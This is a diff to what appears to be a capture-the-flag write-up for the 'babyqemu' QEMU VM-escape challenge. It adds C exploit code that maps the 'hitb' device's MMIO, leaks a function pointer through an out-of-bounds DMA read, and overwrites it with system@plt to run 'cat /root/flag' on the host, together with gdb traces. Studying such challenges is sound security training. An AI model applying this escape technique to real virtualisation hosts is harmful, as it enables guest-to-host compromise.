@@ -13,6 +13,14 @@ git clone https://github.com/w0lfzhang/vmescape
 ```
 
 # babyqemu
+
+```
+sudo apt-get install libaio1 libaio-dev
+sudo add-apt-repository ppa:xapienz/curl34
+sudo apt-get update
+sudo apt install libcurl3
+```
+
 Usually, we will be provided with a compiled qemu file named `qemu-system-x86_64`  
 The organizer will preset some **vulnerable functions** in it.  
 In most of the situation, these vulnerable functions have the same prefix, and the `qemu-system-x86_64` is not stripped.  
@@ -29,6 +37,10 @@ We can easily find them in IDA.
 -m 64M --nographic  -L ./dependency/usr/local/share/qemu \
 -L pc-bios \
 -device hitb,id=vda
+
+login with 
+root
+[EMPTY]
 ```
 We can check the launch.sh file, and find the device name is **hitb**. So we search `hitb` in IDA. 
 
@@ -310,23 +322,174 @@ So that we can leak the enc function after the dma_buf and edit it.
 
 ```
 apt install musl-tools
-mkdir rootfs
+mkdir rootfs && cd rootfs
 cpio -idmv < ../rootfs.cpio
 
-#!/usr/bin
+#!/bin/sh
 cd rootfs
 musl-gcc -static -o exp ../exp.c
 find . | cpio -H newc -o > ../rootfs.cpio
+```
 
+We can make a debugging script and then load it with `-x`
+```
+aslr off
+handle SIGUSR1 nostop noprint
+b hitb_mmio_write
+b *hitb_dma_timer+0x46
+
+r -initrd ./rootfs.cpio \
+-kernel ./vmlinuz-4.8.0-52-generic \
+-append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \
+-enable-kvm \
+-monitor /dev/null \
+-m 64M --nographic  -L ./dependency/usr/local/share/qemu \
+-L pc-bios \
+-device hitb,id=vda 
+```
+
+## Scripting
+
+First we should open the coressponding resource0 file, Then we mapping it to a guest memory(mmio_mem).
+```C
+    // Open and map I/O memory for the strng device
+    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
+    if (mmio_fd == -1)
+        die("mmio_fd open failed");
+
+    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
+    if (mmio_mem == MAP_FAILED)
+        die("mmap mmio_mem failed");
+
+    printf("mmio_mem @ %p\n", mmio_mem);
+```    
+
+Cause the `cpu_physical_memory_rw` uses physical address, we need to convert the virtual address into the physical address.  
+We allocate a DMA buffer and convert the virtual address into physical address with `gva_to_gpa`.
+```C
+    // Allocate DMA buffer and obtain its physical address
+    userbuf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+    if (userbuf == MAP_FAILED)
+        die("mmap");
+
+    mlock(userbuf, 0x1000);
+    phy_userbuf=gva_to_gpa(userbuf);
+```    
+Because the dma buffer's length is 0x1000, and the encrypt function is right behind it.
+```
+00000BB8 dma_buf         db 4096 dup(?)
+00001BB8 enc             dq ?                    ; offset
+```
+Following functions are used to trigger the callback function hitb_mmio_write.
+```
+void dma_set_src(uint32_t src_addr)
+{
+    mmio_write(0x80,src_addr);
+}
+
+void dma_set_dst(uint32_t dst_addr)
+{
+    mmio_write(0x88,dst_addr);
+}
+
+void dma_set_cnt(uint32_t cnt)
+{
+    mmio_write(0x90,cnt);
+}
+
+void dma_do_cmd(uint32_t cmd)
+{
+    mmio_write(0x98,cmd);
+}
+
+void dma_do_read(uint32_t addr, size_t len)
+{
+    dma_set_dst(phy_userbuf);
+    dma_set_src(addr);
+    dma_set_cnt(len);
+    dma_do_cmd(2|1);
+    sleep(1);
+}
+```
+After setting `dma.dst` to the physical address of our user buffer and set the `dma.src` to the idx, which is 0x40000+0x1000.
+Setting the reading length to 8, `dma.cmd` to `2|1`. 
+Timer function will be triggered.   
+And the encrypt function's address will be leaked into the mmaped buffer.
+```
+# ./exp
+mmio_mem @ 0x7f7a448f5000
+user buff virtual address: 0x7f7a448f4000
+user buff physical address: 0x225e000
+leaking enc function: 0x564c3b30fdd0
+
+gdb-peda$ x/20i 0x564c3b30fdd0
+   0x564c3b30fdd0 <hitb_enc>:	test   esi,esi
+   0x564c3b30fdd2 <hitb_enc+2>:	je     0x564c3b30fdec <hitb_enc+28>
+   0x564c3b30fdd4 <hitb_enc+4>:	lea    eax,[rsi-0x1]
+   0x564c3b30fdd7 <hitb_enc+7>:	lea    rax,[rdi+rax*1+0x1]
+   0x564c3b30fddc <hitb_enc+12>:	nop    DWORD PTR [rax+0x0]
+   0x564c3b30fde0 <hitb_enc+16>:	xor    BYTE PTR [rdi],0x66
+   0x564c3b30fde3 <hitb_enc+19>:	add    rdi,0x1
+   0x564c3b30fde7 <hitb_enc+23>:	cmp    rdi,rax
+   0x564c3b30fdea <hitb_enc+26>:	jne    0x564c3b30fde0 <hitb_enc+16>
+   0x564c3b30fdec <hitb_enc+28>:	repz ret 
+   0x564c3b30fdee:	xchg   ax,ax
+   0x564c3b30fdf0 <pci_hitb_register_types>:	lea    rdi,[rip+0x6e5229]        # 0x564c3b9f5020 <hitb_info.27046>
+```
+
+Now we can calculate the system@plt with `hitb_enc`.  
+Write system@plt back into enc function with the oob write vulnerability.  
 
 ```
+[-------------------------------------code-------------------------------------]
+   0x5555557d8134 <hitb_dma_timer+164>:	lea    rbp,[rdi+rax*1+0xbb8]
+   0x5555557d813c <hitb_dma_timer+172>:	mov    rdi,QWORD PTR [rdi+0xb68]
+   0x5555557d8143 <hitb_dma_timer+179>:	mov    rsi,rbp
+=> 0x5555557d8146 <hitb_dma_timer+182>:	call   0x555555763070 <cpu_physical_memory_rw>
+   0x5555557d814b <hitb_dma_timer+187>:	mov    rax,QWORD PTR [rbx+0xb80]
+   0x5555557d8152 <hitb_dma_timer+194>:	mov    rdx,rax
+   0x5555557d8155 <hitb_dma_timer+197>:	and    edx,0x4
+   0x5555557d8158 <hitb_dma_timer+200>:	je     0x5555557d80e8 <hitb_dma_timer+88>
+Guessed arguments:
+arg[0]: 0x341c000 
+arg[1]: 0x555557fa08b8 --> 0x5555557d7dd0 (<hitb_enc>:	test   esi,esi)
+arg[2]: 0x8 
+arg[3]: 0x0 
+[------------------------------------stack-------------------------------------]
+
+
+gdb-peda$ x/20gx 0x555557fa08b8
+0x555557fa08b8:	0x0000555555751b18	0x000000000fffffff
+0x555557fa08c8:	0x0000000000000000	0x0000000000000000
+0x555557fa08d8:	0x0000000000000051	0x0000555557f9ea90
+0x555557fa08e8:	0x0000555557f9ecb0	0x0000000000000000
+
+gdb-peda$ x/20i 0x0000555555751b18
+   0x555555751b18 <system@plt>:	jmp    QWORD PTR [rip+0x92248a]        # 0x555556073fa8
+   0x555555751b1e <system@plt+6>:	xchg   ax,ax
+```
+
+Then we can just call system with the encode function. It will actually call system(dma_buf).
+```C
+    // out of bound to overwrite enc ptr to system ptr
+    dma_do_write(0x1000+DMABASE,&system_plt,8);
+
+    // deply the parameter of system function
+    char *command="cat /root/flag\x00";
+    dma_do_write(0x200+DMABASE,command,strlen(command));
+
+    // trigger the enc ptr to execute system
+    dma_do_enc(0x200+DMABASE,8);
+```
+
+
 
 
 
 
 # Reference
 
-https://github.com/qemu/qemu/blob/master/hw/misc/edu.c
+https://github.com/qemu/qemu/blob/master/hw/misc/edu.c  
 https://askubuntu.com/questions/1061431/how-to-have-both-libcurl3-and-libcurl4-installed-at-same-time
 
 
